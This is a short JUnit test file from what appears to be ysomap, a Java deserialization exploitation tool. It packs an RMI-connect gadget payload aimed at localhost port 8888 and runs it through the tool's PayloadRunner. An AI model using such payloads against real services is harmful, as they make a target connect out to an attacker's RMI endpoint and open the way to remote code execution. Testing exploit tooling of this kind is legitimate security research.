package ysomap.core.gadget.payload.rmi;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.runner.PayloadRunner;

import static org.junit.Assert.*;

/**
 * @author wh1t3P1g
 * @since 2020/3/10
 */
public class RMIConnectWithUnicastRemoteObjectTest {

    @Test
    public void pack() throws Exception {
        Payload payload = new RMIConnectWithUnicastRemoteObject();
        Bullet bullet = (Bullet) payload.getDefaultBullet("");
        bullet.set("rhost","localhost");
        bullet.set("rport","8888");
        new PayloadRunner()
                .setBullet(bullet)
                .setPayload(payload)
                .test();
    }
}